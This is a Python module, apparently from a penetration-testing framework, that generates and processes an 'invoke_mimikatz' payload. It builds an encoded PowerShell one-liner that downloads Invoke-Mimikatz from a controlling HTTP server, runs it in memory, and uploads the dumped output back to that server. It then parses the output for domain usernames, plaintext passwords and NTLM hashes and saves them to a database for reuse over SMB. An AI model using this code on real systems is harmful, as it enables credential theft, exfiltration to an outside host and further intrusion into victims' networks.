import sys
import os
import re
sys.path.append(os.path.join(os.path.dirname(__file__), '..', '..'))
from utils.db import DB
from utils.output import Output
from server.ressources import get_ressource_md5, powershell_encode_base64

class Payload:
    name = 'invoke_mimikatz'
    type = 'cmd'
    args = ['ip:http_port']
    filename = 'Invoke-Mimikatz.ps1'
    md5 = get_ressource_md5('Invoke-Mimikatz.ps1')

    def generate_payload(self, url):
        # Mimikatz in memory

        if not url.startswith('http://'):
            url = 'http://' + url

        # Stage1: load Invoke-Mimikatz.ps1
        stage1 = 'IEX(New-Object Net.WebClient).DownloadString("%s/ressources/%s")' % (url, self.md5)

        # Stage2: execute mimikatz
        stage2 = '$Out = Invoke-Mimikatz'

        # Stage4: post result
        stage3 = '(New-Object Net.WebClient).UploadString("%s/ressources/%s", $Out)' % (url, self.md5)

        payload = ';'.join([stage1, stage2, stage3])

        return "powershell.exe -e %s" % powershell_encode_base64(payload)

    def process_output(self, file_path):

        # Retrieve IP from filename
        filename = os.path.basename(file_path)
        ip = filename.split('_')[-2]

        user = {
            'ip': ip,
        }

        f = open(file_path)
        for line in f:
            line = line.strip()

            m = re.match('^\s*\*\s+(Username|Domain|NTLM|Password)\s+:\s+(.+)\s*$', line)
            if m:
                key = m.group(1)
                value = m.group(2)

                if key == 'Username':
                    user['username'] = value
                elif key == 'Domain':
                    user['domain'] = value
                elif key == 'Password':
                    user['type'] = 'password'
                    user['password'] = value

                    if user['username'] != '(null)' and user['domain'] != '(null)' and user['password'] != '(null)':
                        if not user['username'].endswith('$'):
                            Output.major('New user password: {domain}\\{username}:{password}'.format(**user))
                            DB.insert_domain_credential(user)

                    user = {
                        'ip': ip,
                    }
                elif key == 'NTLM':
                    user['type'] = 'hash'
                    user['format'] = 'ntlm'
                    user['hash'] = value

                    if user['username'] != '(null)' and user['domain'] != '(null)' and user['hash'] != '(null)':
                        if not user['username'].endswith('$'):
                            Output.major('New user hash: {domain}\\{username}:{hash}'.format(**user))
                            DB.insert_domain_credential(user)

                    user = {
                        'ip': ip,
                    }

            m = re.match('^\s*(User|Hash NTLM)\s*:\s+(.+)\s*$', line)
            if m:
                key = m.group(1)
                value = m.group(2)

                if key == 'User':
                    user['username'] = value
                elif key == 'Hash NTLM':
                    user['hash'] = value
                    Output.major('New local user hash: {ip} {username}:{hash}'.format(**user))

                    cred_info = {
                        'hostname': ip,
                        'port': 445,
                        'service': 'smb',
                        'url': 'smb://%s:445' % ip,
                        'type': 'hash',
                        'format': 'ntlm',
                        'username': user['username'],
                        'hash': user['hash'],
                    }
                    DB.insert_credential(cred_info)

                    user = {
                        'ip': ip,
                    }

        f.close()
